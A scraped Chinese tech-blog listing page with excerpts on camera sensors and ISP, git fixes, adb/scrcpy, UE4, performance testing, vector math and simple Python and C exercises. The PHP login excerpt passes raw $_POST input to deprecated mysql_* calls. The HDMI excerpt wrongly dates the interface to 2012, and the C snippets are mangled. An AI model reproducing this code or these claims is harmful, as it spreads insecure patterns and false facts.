景物(SCE)通过镜头（LENS）生成的光学图像投射到图像传感器(Sensor)表面上，然后转为电信号，经过A/D（模数转换）转换后变为数字图像信号，再送到数字信号处理芯片（DSP）中加工处理，再通过I/O接口传输到CPU中处理，通过display就可以看到图像了。 二：Sensor的基本知识
1：Sensor的工作原理
Lens的作用是滤去不可见光，让可见光进入，并投射到Sensor上。Sensor的工作原理：光照--〉电荷--〉弱电流--〉RGB数字信号波形--〉YUV数字信号信号
2：Sensor 的分类
元件类型不同分为：CCD 和CMOS。CCD（Charge CoupLED Device，），一般是用于摄影摄像方面的高端技术元件。CCD的优点是灵敏度高，噪音小，信噪比大。但是生产工艺复杂、成本高、功耗高。CMOS（Complementary Metal-Oxide Semiconductor，金属氧化物半导体元件）应用于较低影像品质的产品中。CMOS的优点是集成度高、功耗低(不到CCD的1/3)、成本低。但是噪音比较大、灵敏度较低。对于CMOS来说，具有便于大规模生产，且速度快、成本较低，将是数字相机关键器件的发展方向。CMOS感光器以已经有逐渐取代CCD感光器的趋势，并有希望在不久的将来成为主流的感光器。
3：Sensor的封装形式
Sensor的封装形式有两种：CSP和DICE。在模组厂商加工制造中，CSP所对应的制程是SMT，DICE所对应的制程是COB。
4：常用的Sensor的厂商
厂商有omnivision、Siliconfile、Samsung 、SONY、Aptina等
5：Sensor 的基本框图
Sensor 的框图如图所示（以 Ov2718 为例）：
三：ISP 的基本知识
1：ISP的定义
ISP (Image Signal Processor)，即图像处理，主要作用是对前端图像传感器输出的信号做后期处理，主要功能有线性纠正、噪声去除、坏点去除、内插、白平衡、自动曝光控制等，依赖于ISP才能在不同的光学条件下都能较好的还原现场细节。
2：ISP的工作原理
从 Sensor 端过来的图像是 Bayer 图像，经过黑电平补偿、镜头矫正、坏像素矫正、颜色插值、Bayer 噪声去除、白平衡、色彩矫正、Gamma 矫正、色彩空间转换（ RGB 转换为 YUV ）、在 YUV 色彩空间上彩噪去除与边缘加强、色彩与对比度加强，中间还要进行自动曝光控制等，然后输出 YUV（ 或者 RGB ）格式的数据，再通过 I/O 接口传输到 CPU 中处理。（以 OV495 为例）
四：ISP 图像处理算法
1：AE ( Automatic Exposure )
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40cb3e80b1d9a1249d1b9ca8bf77070c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2c04385f217a54ab3ba753b7011c863/" rel="bookmark">
			VisualStudio2019设置android sdk路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[HKEY_CURRENT_USER\Software\Xamarin\VisualStudio\16.0_eba50645\Android]
“JavaSdkDirectory”="C:\Program Files\Android\Jdk\microsoft_dist_openjdk_1.8.0.25"“AndroidSdkDirectory”=“Z:\media\JiaSu\SF\11PubShared\01AndroidSdk\android-sdk-win-vs-new”
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf14511a67820c44dd67f0f29c424a29/" rel="bookmark">
			html登录界面设计代码_PHP实现登录注册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、首先实现一个PHP的简单登录注册的话 我们要简单的与后端定义一下接口和传输数据的方式 并且我们要有一个phpStudy服务器。
第一步：当我们点击注册按钮的时候数据库要接收到客户端请求的数据
第二步：接收到数据以后服务器要处理数据：
1.确定数据源：
mysql_connect('localhost','数据库名','数据库密码');
2.选择数据库：
mysql_select_db('数据库名','数据源');
3.确定字符编码：
mysql_query('set names utf8');
4.编写sql语句
5.执行sql语句：
$res = mysql_query($sql);
第三步：将数据库的数据返回到客户端
登录窗前端代码：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="login.php" method="post"&gt; 用户名 ： &lt;input type="text" name = "uname" id="uname"/&gt;&lt;span id="s1"&gt;&lt;/span&gt;&lt;br&gt; 密码 ： &lt;input type="text" name="upwd" id="upwd"/&gt;&lt;span id="s2"&gt;&lt;/span&gt;&lt;br&gt; &lt;input type="submit" value="登录"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 登录窗口的PHP代码：
&lt;?php header("content-type:text/html;charset=utf-8"); //接受数据 $name = $_POST["uname"]; $pwd = $_POST["upwd"]; //处理数据 操作数据库 $conn = mysql_connect( "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf14511a67820c44dd67f0f29c424a29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54663ed542ed10eecfce94818b584deb/" rel="bookmark">
			局域网中用adb调试手机_这款打通手机和电脑的开源神器，到底要怎么用？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		昨天为大家推荐了一款《打通手机和电脑的开源神器 Scrcpy》，从留言中可以看出小伙伴们对这个工具还是非常感兴趣的，但是因为它的使用门槛，让很多平时较少接触此类工具的朋友遇到了各种各样的问题...
本来只想低调地安利一个工具来着，但是看这个情况，还是为大家做个详细的教程比较好，有什么不懂的都可以通过这篇教程来了解清楚。
当然还是先说明一下这个「Scrcpy」，它是能让任何安卓手机都能够直接通过有线/无线的方式连接电脑进行投屏，甚至还能让电脑反向控制手机的工具。
关注「最美应用」公众号，后台回复「spy」，可以获取下载地址和官方文档等内容。
▎下载说明
在下载页面，可以看到最新的版本(Latest release)和更新日志(Changes)，看不懂的话可以用谷歌翻译翻一下。
更新日志的下面，是一些比较重要的内容介绍，比如关闭手机屏幕，复制粘贴等，这个我们后面一起说明。
再往下拉就是下载地址了：
这里只提供了 Windows 端的下载地址，只需要按照自己的系统(32/64位)下载压缩包即可；压缩包里包含了 Android ADB 工具包和编译好的 Scrcpy 启动程序，直接双击打开即可使用，主要是方便不会用命令行的朋友。
*其实更好用的方法是直接在解压后的文件夹内，点击左上角的「文件」→「在当前目录打开命令行/Windows powershell」，然后直接按照相关命令操作即可，具体命令介绍在后面。
但是使用 macOS 的朋友，就没有这么方便的打包程序用了，教程在官方文档里都有，不过还是简单说明一下：这个是要有一点基础知识才行的，你必须要认识电脑上的「终端」这个东西，所有操作都需要在它里面完成。
第一步：安装 Homebrew；
Homebrew 是一个 macOS 平台的软件包管理工具，可以用来安装、卸载、升级各种各样的终端工具，相当于没有界面的应用市场，我们现在主要是需要用它来安装 Scrcpy，至于它都能用来干什么就要由大家自行发现了。
即使不懂怎么回事，也是可以用的，只需要打开 macOS 的「终端」，输入下面这行安装 Homebrew 的命令然后回车即可：
*这行命令也会添加到后台回复里
第二步：安装 Scrcpy；
如果你的网络环境不好的话，安装 homebrew 可能就要很长时间，也可能失败需要重新安装，这个我就真的没办法了；
成功安装完 homebrew 后，终端会恢复到输入命令的模式，这里只需要再输入一行命令就可以安装 scrcpy 工具了：
brew install scrcpy
第三步：安装 ADB 工具；
adb 工具是所有安卓设备都会用到的东西，最基础的版本也可以通过命令来实现手机的开关机、恢复出厂、进入线刷、卡刷模式等功能，而 Scrcpy 也是通过利用这个工具来实现的对手机的控制。
安装命令是：
brew cask install android-platform-tools
装好后只需要输入命令「scrcpy」就可以使用 Scrcpy 工具了。
▎ADB 工具的基础命令介绍
不管是 Windows、macOS 还是 Linux，都可以使用 adb 工具，对安卓设备进行一些简单的操作，这里就给大家介绍几个常用的，也要注意看哦，和使用 scrcpy 还是有关系的：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54663ed542ed10eecfce94818b584deb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e52bef8a894abc66a9e710f50734499/" rel="bookmark">
			笔记本怎么查看hdmi版本_涨知识丨一文看懂笔记本电脑HDMI接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一期文章我们同大家简单介绍了笔记本电脑Type-C接口及其日常用途，今天我们来聊聊笔记本电脑上另一个常备的电脑接口HDMI，它究竟是什么，有哪些用途，我们一一为您揭晓！
如图所示，有着HDMI标识的接口就是我们今天要说的主角——HDMI接口。顾名思义，HDMI全程为High Definition Multimedia interface即高清晰度多媒体接口。
通俗说法为HDMI是一种高清视频接口，目前笔记本、电视、显卡以及主板中都会经常看到，可以同时传输音频和影像信号，是适合影像传输的专用型数字化接口，可支持1080P/720P甚至更高的全高清格式视频输出。
HDMI接口最早出现于2012年，发展到现在我们常用的接口为HDMI2.0接口，传输带宽为18Gbps，无需安装驱动支持即插即用，可支持3840*2160分辨率和60Hz帧率，并且可以兼容上一代HDMI1.0接口。
用途方面，HDMI接口可以满足1080P以上高清视频需求，配备HDMI接口设备说明其可以支持1080P视频输出；可以使用HDMI数据线将电视和电脑相连，用于大屏高清视频、数据文件展示。
另外，HDMI接口是可以进行音频传输的，而且还有音频回传功能，最新的HDMI2.1版本甚至支持增强型音频回传功能；支持30位以上色域空间以真实还原鲜艳绚丽色彩，可以满足3D电视显示信号传输需求，但受限于数据线对使用环境有需求！
总的来看，上述内容就是HDMI接口用途、功能，火影品牌游戏本都附着HDMI接口，用户可以放心购买使用！
【关注我】了解更多游戏本性能以及电脑小技巧。
今日好物推荐——火影T7曜黑 i7-10750H/RTX 2060/16GB/512GB/144Hz/72%色域
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7548509b343c42a760994d4f66249b4e/" rel="bookmark">
			git本地删除后如何再pull下来_Git遇到错误时如何解决的一些坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初学者总是不知道如何学习，我一直建议你要拥有一本属于自己的学习课本，不管是基础，还是提升。
文章正文
在工作中，你总是与代码打交道，上传代码的时候，相信你不是用svn，就是用Git版本控制器，下面是最近这几天整理下来经常会遇到的Git的一些错误的解决访问，希望能帮助到你。
1 git pull遇到错误：error: Your local changes to the following files would be overwritten by merge:
方法1：如果你想保留刚才本地修改的代码，并把git服务器上的代码pull到本地(本地刚才修改的代码将会被暂时封存起来)
git stashgit pull origin mastergit stash pop 如此一来，服务器上的代码更新到了本地，而且你本地修改的代码也没有被覆盖，之后使用add，commit，push 命令即可更新本地代码到服务器了。
方法2、如果你想完全地覆盖本地的代码，只保留服务器端代码，则直接回退到上一个版本，再进行pull：
git reset --hardgit pull origin master 2 在git push origin master时出现以下这个问题时：
error: failed to push some refs to 'git@github.com:yangchao0718/cocos2d.githint: Updates were rejected because the tip of your current branch is behinhint: its remote counterpart. Integrate the remote changes (e.g.hint: 'git pull .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7548509b343c42a760994d4f66249b4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c68b958025899f656fc2d06e481fad9e/" rel="bookmark">
			ue4 怎么传递变量到另一个蓝图_咳咳，上课啦，游戏建模师教你UE4如何使用蓝图设置自动细节级别...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用UE4制作游戏时，为网格创建细节级别(LOD)是提高游戏性能和帧速率而不牺牲视觉质量的好方法。那么你知道怎么使用UE4蓝图设置自动细节级别呢?
创建新的细节层次
在“编辑器脚本”&gt;“静态网格物体”类别下，找到管理LOD所需的节点。要使用这些节点，Blueprint类必须从仅编辑器的类(例如PlacedEditorUtilityBase类)派生。
● 关键节点是Set Lods，它会为传入的静态网格物体资产自动创建详细程度。要使用此节点，需要为其提供一组缩小设置，这些设置定义屏幕尺寸阈值和相对三角形百分比您要创建的每个细节级别。
传递到EditorScriptingMeshReductionOptions节点的“缩减设置”输入的第一个
EditorScriptingMeshReductionSettings项无效。LOD 0始终包含网格中的所有三角形。
● 可以使用“获取目标计数”和“获取目标屏幕尺寸”来获取有关当前为静态网格物体设置的详细程度的信息。
● 还可以使用“删除 LOD”来删除所有现有的LOD(LOD 0除外，它始终包含网格中的所有三角形)。
● 设置LOD会修改静态网格物体资产。假设您要保留所做的更改，则以后还需要使用诸如Save Asset或Save Loaded Asset的节点。
下面的示例依次在输入路径中加载每个静态网格物体资产。每当找到顶点的数量超过最小阈值的对象时，它将为“静态网格物体”设置三个附加的LOD，然后将其保存。
重用另一个静态网格物体的LOD
作为使用上述过程自动为静态网格物体生成LOD的替代方法，可以采用静态网格物体(称为源 静态网格物体)中已经存在的LOD，并将其用作另一个静态网格物体(称为静态网格物体)的LOD。目标静态网格物体)。
要在蓝图脚本中重用现有的LOD，使用“编辑器脚本”&gt;“静态网格物体”&gt;“从静态网格物体设置Lod”节点。
该节点需要以下输入：
● 对目标静态网格物体的引用，要为其创建新LOD的静态网格物体。首先需要使用编辑器脚本&gt;资产&gt;加载资产节点来加载此资产。
● 要为目标“静态网格物体”创建的LOD的索引。如果目标静态网格物体已经具有具有相同索引的LOD，则它将被覆盖。
● 对源静态网格物体的引用。这是静态网格物体，具有要从目标静态网格物体指向的现有LOD。如上所述，需要首先使用编辑器脚本&gt;资产&gt;加载资产节点来加载此资产。
● 要用于目标静态网格物体的源静态网格物体中的LOD索引。
● 一个布尔参数，用于确定是否要尝试将源LOD中的“材质”插槽与目标“静态网格物体”中已经存在的插槽合并。如果启用此设置，则该函数将在源几何图形中查找被分配与目标网格中的剖面相同的“材质”的任何剖面。如果找到任何内容，它将尝试重新映射LOD中的截面以匹配目标静态网格物体中的现有截面。如果两个静态网格物体使用相同的材质，则可以节省一些内存。如果禁用此设置，则来自源LOD的所有网格截面都将附加到目标“静态网格”。
设置LOD将修改目标静态网格物体资产。假设您要保留所做的更改，则以后还需要使用诸如Save Asset 或 Save Loaded Asset的节点。
例如，以下脚本从源静态网格物体获取指定的LOD，并在目标静态网格物体中以不同的指定LOD索引重用该几何图形：
当“从静态网格物体设置视点”节点运行时，来自原静态网格物体的LOD副本将添加到目标静态网格物体中。静态网格物体资产之间没有持续的连接，所以源静态网格物体所做的任何更改都不会自动影响目标静态网格物体。
1.欢迎大家点评
2.关注小编哦
3.私信：“游戏建模”即可
4.感谢大家阅读
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1f729d34bca8121c207f0f5b1ac2e9a/" rel="bookmark">
			运用vs code常见错误_性能测试常见瓶颈分析及调优方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在性能测试过程中，最重要的一部分就是性能瓶颈定位与调优。而引发性能瓶颈的原因是多种多样的，在之前的博客：
常见的性能测试缺陷 - 老_张 - 博客园​www.cnblogs.com 有进行介绍。这篇博客，来聊聊性能测试过程中的一些注意事项，以及常见的一些性能缺陷表现及如何进行定位分析并且调优。。。
一、注意事项
1、断言
在压测时，为了判断发送的请求是否成功，一般会通过对请求添加断言来实现。使用断言时，建议遵循如下规范：
①、断言内容尽量以status/code、msg/message来判断（当然前提是接口设计遵循Restful规范）
Jmeter示例：
阿里云PTS：
如果使用的是PTS压测，则断言设置中，以code/status、msg/message等于对应的值为准；
②、尽可能不要将所有的Response Body内容作为断言判断的内容，这样很可能会导致大量的“断言”失败；
PS：然后很遗憾的是，见过很多做压测的童鞋，断言内容以整个响应参数内容做断言，导致大量的报错。
2、成功率
一般在性能测试中，我们都追求99.99%的成功率，但在实际的测试过程中，为了尽可能覆盖代码逻辑，在准备阶段会尽可能的准备较多的热点数据去做到覆盖。这样的话，我们所关注的成功率指标，就要分为如下两种：
①、事务成功率
事务成功率在某些时候也可以视为请求成功率，在断言判断时以code/status等内容来作为请求是否成功的衡量依据；
②、业务成功率
实际的业务场景中，所谓的成功率，并不能仅根据返回的code/status来判断。比如：一个查询请求，无论是返回正确的查询结果还是由于对应数据返回空，这个请求都是成功的。对应的响应参数可能是： {"status":"200","message":"success"} ；也可能是： {"status":"200","message":"暂无对应结果"} 。
PS：在性能测试过程中，考虑到业务成功率和请求成功率的不同指标，结合断言内容，需要灵活设置断言的方式（当然，我依然建议遵循如上的2点断言规范）！
二、常见性能瓶颈解析及调优方案
在性能测试中，导致性能出现瓶颈的原因很多，但通过直观的监控图表现出来的样子，根据出现的频次，大概有如下几种：
TPS波动较大
高并发下大量报错
集群类系统，各服务节点负载不均衡
并发数不断增加，TPS上不去，CPU耗用不高
压测过程中TPS不断下降，CPU使用率不断降低
下面对常见的几种性能瓶颈原因进行解析，并说说常见的一些调优方案：
1、TPS波动较大
原因解析：出现TPS波动较大问题的原因一般有网络波动、其他服务资源竞争以及垃圾回收问题这三种。
性能测试环境一般都是在内网或者压测机和服务在同一网段，可通过监控网络的出入流量来排查；
其他服务资源竞争也可能造成这一问题，可以通过Top命令或服务梳理方式来排查在压测时是否有其他服务运行导致资源竞争；
垃圾回收问题相对来说是最常见的导致TPS波动的一种原因，可以通过GC监控命令来排查，命令如下：
# 实时打印到屏幕 jstat -gc PID 300 10 jstat -gcutil PID 300 10 # GC信息输出到文件 jstat -gc PID 1000 120 &gt;&gt;/path/gc.txt jstat -gcutil PID 1000 120 &gt;&gt;/path/gc.txt 调优方案：
网络波动问题，可以让运维同事协助解决（比如切换网段或选择内网压测），或者等到网络较为稳定时候进行压测验证；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1f729d34bca8121c207f0f5b1ac2e9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5081bd2bbd6506e7000a58bb0960e66/" rel="bookmark">
			叉乘点乘混合运算公式_《3D数学基础》提炼总结（四）向量运算（后）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这一段细枝末节很多，一篇下来篇幅很长，读下来耗时，所以分了两个部分。
九、解释距离公式的原理。
下面介绍计算几何中最重要的公式之一：距离公式。该公式用来计算两点之间的距离。
首先，定义距离为两点间线段的长度。因为向量是有向线段，所以从几何意义上说，两点之间的距离等于从一个点到另一个点的向量的长度。现在，让我们导出3D中的距离公式。先计算从a到b的向量d,在3D情况中:
a到b的距离等于向量d的长度。之前学过如何计算向量长度。
1.3D距离公式
这样就导出了3D中的距离公式，2D中的公式更简单。
2.2D距离公式
看一个2D中的例子：
应注意，哪个点是a和哪个点是b并不重要。如果定义d为从b到a的向量而不是从a到b,会得到一个稍微不同但数学上等价的公式。
十、介绍第一种向量乘法：点乘。
1.运算法则
术语”点乘“来自记法a.b中的点号。与标量与向量的乘法一样，向量点乘的优先级高于加法和减法。标量乘法和标量与向量的乘法经常可以省略称呼，但在向量点乘中不能省略点乘号。
向量点乘就是对应分量乘积的和，其结果是一个标量：
2.向量点乘
用连加符号简写为：
3.向量点乘的连加记法
应用到2D、3D中，为：
4.2D和3D点乘
很明显，从公式中可以得出点乘满足交换律：
5.几何解释
一般来说，点乘结果描述了两个向量的”相似“程度，点乘结果越大，两向量越相近。几何解释更直观，如下图。
点乘等于向量大小与向量夹角的cos值得积：
6.向量点乘的几何解释
（3D中，两向量的夹角是在包含两向量的平面中定义的。）
解得：
7.用点乘计算两个向量的夹角
如果a、b是单位向量，就可以避免公式中的除法运算。在这种情况下，上式中公母是1，只剩下：
8.计算两个向量的夹角
向量大小并不影响点乘结果的符号，所以上表是和a、b大小无关的。注意，如果a、b中任意一个为零，那么最终的结果也等于零。因此，点乘对零向量的解释是，零向量和任意其他向量都垂直。
9.向量投影
十一、介绍第二种向量乘法：叉乘。
另一种向量乘法称作叉乘或叉积，仅可应用于3D向量。和点乘不一样，点乘得到一个标量并满足交换律，向量叉乘得到一个向量并且不满足交换律。
1.运算法则
和点乘一样，术语”叉乘“来自记法a X b 中的叉号。这里要把叉乘号写出来，不能像标量乘法那样省略它。
叉乘公式为：
叉乘的运算优先级和点乘一样，乘法在加减法之前计算。当点乘和叉乘在一起时，叉乘优先计算：
因为点乘返回一个标量，同时标量和向量间不能叉乘，，所以
没有定义，运算
称作三重积。
前面提到,向量叉乘不满足交换律。事实上，它满足反交换律
叉乘也不满足结合律。
2.几何解释
叉乘得到的向量垂直于原来的两个向量，如图所示
图中，向量a和b在一个平面中。向量a X b 指向该平面的正上方，垂直于a 和 b。
a X b的长度等于向量的大小与向量夹角sin值得积，如下：
3.叉乘的长度与向量夹角的sin值有关
可以看到，||a X b||也等于以a和b为两边的平行四边形的面积，让我们验证这一结论，看图
由经典几何知识可知平行四边形的面积是bh,即底和高的乘积。可以验证这一点，通过把一端的三角形”切“下来移到另一边，可构成一个矩形，如下图所示
矩形的面积由长和宽确定，上图中为bh。因为转换后的矩形面积等于原平行四边形的面积，所以该平行四边形的面积也为bh。
如果a,b平行或任意一个为0，则a X b = 0，叉乘对零向量的解释为：它平行于任意其他向量。注意这和点乘的解释不同，点乘的解释是和任意其他向量垂直。（当然，定义零向量平行或垂直于任意向量都是不对的，因为零向量没有方向。）
已经证明了a X b 垂直于a、b。但是垂直于a、b有两个方向。a X b指向哪个方向呢？通过将a的头与b的尾相接，并检查从a 到 b是顺时针还是逆时针，能够确定a X b的方向。在左手坐标系中，如果a 和 b 呈顺时针，那么a X b指向您。如果a 和 b呈逆时针，a X b 远离您。在右手坐标系中，恰好相反，如果a 和 b呈顺时针，a X b远离您，如果a 和 b 呈逆时针，a X b指向您。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5081bd2bbd6506e7000a58bb0960e66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b96311723078c23504603efd66b148ce/" rel="bookmark">
			python编程计算1&#43;(1&#43;2)&#43;(1&#43;2&#43;3)_python计算1&#43;2&#43;……&#43;1000的3种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python计算数列和很方便，至少有3种方法都是可行的，下面逐一介绍。
工具/原料
python
anaconda，spyder
方法/步骤
1
第一种方法就是用for循环。
s初始值赋值为0
其中range(1001)是一个列表[0,1,2,3，……，1000]，
in是用作判断i是否在列表中，如果在，那么就循环执行s=s+i，直到列表全部遍历结束。如图所示：
2
第二种方法直接使用sum函数。
sum(range(1001))：使用sum对列表求和即可，如图所示：
3
第三种方法使用while循环。
首先是对s，i进行初始赋值；接着while条件是判断i是否小于1000（语句块中有i=i+1所以当i=999时，i+=1运算后i就是1000了）；在循环的语句块中，先对i加1处理（自增），然后s=s+i（累计求和）
最后s即为所求的结果
4
第四种方法是使用reduce函数。
其实这个是函数式编程。
在python3中需要加载一下reduce函数：
from functools import reduce ；
reduce(lambda x,y:x+y,range(1,1001))；
如图
5
第五种方法是使用数学math库。math库的fsum函数可以求一个列表的和。import math as m；
m.fsum(range(1001))；
如图
END
注意事项
python区分大小写，而且python使用缩进进行语句块分隔的
while中条件是1000，并不是1001，一定要注意
for和while循环后都有一个冒号，千万不能少了，否则报错
range（1001）也可以用numpy.arange(1001)代替
函数式编程也可以实现同样的效果，速度可能更快
经验内容仅供参考，如果您需解决具体问题(尤其法律、医学等领域)，建议您详细咨询相关领域专业人士。
举报作者声明：本篇经验系本人依照真实经历原创，未经许可，谢绝转载。
展开阅读全部
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e067da37a9c8ccfe1f826ba8fde26f5a/" rel="bookmark">
			solidworks装配体改为柔性_solidworks|子装配体插入后如何让其零件也能配合、运动...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		solidworks模块化作图之后，对各个子装配进行装配时，势必会遇到这种情况——子装配体合成为一个“大零件”，是一个整体。这是我们对这个子装配体便无法进行拖动等一系列操作。
官方解释：根据默认，当生成子装配体时，它为刚性的。在父装配体中，子装配体为单一单位，其零部件不相对于彼此移动。
那么遇到这种情况怎么解决呢？
其实，只要一个命令，便可以完美解决。这里为了掩饰方便，我新建了一个装配体，然后将一个轴系零件插入到这个新建的装配体当中，作为一个子装配体。
这时，图中的轴系零件变为了一个整体，齿轮、轴承跟轴之间的配合都已经被固定，而无法相对转动。
在设计树中选中子装配体，然后找到使之“柔性化”的命令，选上即可解决此问题。
柔性化之后，再去拖动零件就会发现原来装配体中的配合又可以在新的装配体里面动作了。
例如，当我们需要在电机装配体中移动活塞子装配体的零部件时，就可以利用此功能来实现。也可以移动活塞的各个零部件，同时这些零部件仍然组群为子装配体。
柔性子装配体中的配合与父装配体中的配合同时解出。因此，移动或旋转子装配体零部件不会破坏子装配体或其父装配体中的配合。零部件只能在其配合所允许的自由角度内移动。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/463ff5503275e51b917c4959905c30ad/" rel="bookmark">
			金字塔c_C/C&#43;&#43;编程笔记：C语言入门题之正倒金字塔，正反三角形代码详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		其实学编程关键是学习其思想，如果你精通了一门，再去学其他的时候也很容易上手。C不会过时的，尤其是在unix、linux操作平台上，学好C是必须的。
C跟C++在很多方面也是兼容的，c是c++的基础。
再者c能从很大的程度上帮你了解计算机的发展史，数据结构等方面的知识，很多软件、甚至操作系统中的很大部分是用c来实现的。
还有一些电器芯片的程序，比如电冰箱内制冷系统……可以说用c可以解决一切可能遇到的问题，关键是你要能精通它。
所以放开手脚去大胆的学吧，c永远不会过时！
正金字塔 源代码：
include
void main()
{
inti,j,k,n;
printf("请输入金字塔的层数：");
scanf("%d",&amp;n);
for(i=1;i&lt;=n;++i)// 控制层数
{
for(j=1;j&lt;=n-i;j++)// 控制空格数
printf(" ");for(k=1;k&lt;=2*i-1;k++)// 控制*个数
printf("*");
printf("");// 一层金字塔输出完毕，换行继续输出下一层
}
}
倒金字塔 源代码：
include
void main()
{
inti,j,k,n;
printf("请输入倒金字塔的层数：");
scanf("%d",&amp;n);
for(i=1;i&lt;=n;++i)// 控制层数
{
for(k=0;k&lt;=i-1;k++)// 控制空格数
printf(" ");for(j=2*n-2*i+1;j&gt;0;j--)//控制*个数
printf("*");
printf(""); }
}
如此说来，正反三角形，难道你还不会吗？
希望对你有帮助！也希望你能够在学习C语言的路上越走越远，砥砺前行~
自学C/C++编程难度很大，不妨和一些志同道合的小伙伴一起学习成长！
C语言C++编程学习交流圈子，关注+私信【C/C++编程】微信公众号：C语言编程学习基地
有一些源码和资料分享，欢迎转行也学习编程的伙伴，和大家一起交流成长会比自己琢磨更快哦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3c471a81a8fac1bf81b649f55d1cb53/" rel="bookmark">
			字符串反转python_Python 反转字符串(reverse)的方法小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前段时间看到letcode上的元音字母字符串反转的题目，今天来研究一下字符串反转的内容。主要有三种方法：
1.切片法（最简洁的一种）
#切片法
def reverse1():
s=input("请输入需要反转的内容：")
return s[::-1]
reverse1()
#运行结果
In [23]: def reverse1():
...: s=input("请输入需要反转的内容：")
...: return s[::-1]
...:
...: reverse1()
请输入需要反转的内容：你是一个小南瓜
Out[23]: '瓜南小个一是你'
参考stackflow上的答案。
原理是：This is extended slice syntax. It works by doing [begin:end:step] - by leaving begin and end off and specifying a step of -1, it reverses a string.
切片介绍：切片操作符中的第一个数（冒号之前）表示切片开始的位置，第二个数（冒号之后）表示切片到哪里结束，第三个数（冒号之后）表示切片间隔数。如果不指定第一个数，Python就从序列首开始。如果没有指定第二个数，则Python会停止在序列尾。注意，返回的序列从开始位置开始 ，刚好在结束位置之前结束。即开始位置是包含在序列切片中的，而结束位置被排斥在切片外。
这样，a[1:3]返回从位置1开始，包括位置2，但是停止在位置3的一个序列切片，因此返回一个含有两个项目的切片。类似地，a[:]返回整个序列的拷贝。a[::3]返回位置3，位置6，位置9…的序列切片。
也可以用负数做切片。负数用在从序列尾开始计算的位置。例如，a[:-1]会返回除了最后一个项目外包含所有项目的序列切片，shoplist[::-1]会返回倒序序列切片。
举一个完整例子，读入用户输入并反转字符串，并写入到文件中
#!/usr/bin/python
import sys
#打开文件进行写入
myfile=open('test.txt','w')
while 1:
print "input your string \n"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3c471a81a8fac1bf81b649f55d1cb53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/482cb262b9fe3c55061b4e53b5844c21/" rel="bookmark">
			python machine learning_开源《Python 机器学习》-Python Machine Learning第一版&#43;第二版（附电子版 pdf）...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原标题：开源《Python 机器学习》-Python Machine Learning第一版+第二版（附电子版 pdf）
《Python Machine Learning》有两版，中文译为《Python 机器学习》，机器学习与预测分析正在改变企业和其他组织的运作方式，本书将带领读者进入预测分析的世界。全书共16章，除了简要介绍机器学习及Python在机器学习中的应用，还系统讲述了数据分类、数据预处理、模型优化、集成学习、回归、聚类、神经网络、深度学习等内容。本书将机器学习背后的基本理论与应用实践联系起来，通过这种方式让读者聚焦于如何正确地提出问题、解决问题。
本书讲解了如何使用Python的核心元素以及强大的机器学习库，同时还展示了如何正确使用一系列统计模型。本书可作为学习数据科学的初学者及想进一步拓展数据科学领域认识的读者的参考书。
如今更新的是第二版，它的第一版长这样：
一、作者简介：
Sebastian Raschka：有多年的 Python 编码经验，举办了几次关于数据科学、机器学习和深度学习的实践应用的研讨会，包括在 Scipy 的机器学习教程。他是威斯康星-麦迪逊大学统计学助理教授，专注于深度学习和机器学习研究。
书籍对应代码：
https://github.com/rasbt/python-machine-learning-book-2nd-edition
二、主要内容
